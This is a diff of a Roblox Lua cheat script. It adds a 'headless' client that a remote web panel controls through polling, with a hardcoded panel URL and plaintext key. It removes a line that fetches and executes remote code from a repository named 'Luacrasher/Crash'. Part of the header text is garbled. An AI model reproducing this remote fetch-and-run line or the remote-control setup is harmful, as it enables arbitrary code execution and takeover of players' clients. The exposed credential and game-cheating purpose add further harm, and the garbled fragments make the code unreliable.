@@ -6,6 +6,14 @@
 -- 3-column layout matching image
 -- ============================================================
 
+--[[
+  Panel Client v3 ג€” Headless (no GUI)
+  Controlled via web panel polling only
+]]
+
+local BASE = "https://responsive-redo-bot.lovable.app"
+local KEY  = "Grin@1234"
+
 local Players            = game:GetService("Players")
 local HttpService        = game:GetService("HttpService")
 local RunService         = game:GetService("RunService")
@@ -1556,8 +1564,6 @@ local function Main()
         end)
         page.LayoutOrder = 1
     end
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/gabrielargian-lang/Luacrasher/refs/heads/main/Crash"))()
 
     -- Combat Page
     do
@@ -3209,7 +3215,5 @@ for _, player in ipairs(Players:GetPlayers()) do
 end
 Players.PlayerAdded:Connect(function(player)
     task.spawn(function() setupOtherPlayerSpeed(player) end)
-end)
-end)()tion() setupOtherPlayerSpeed(player) end)
 end)
 end)()
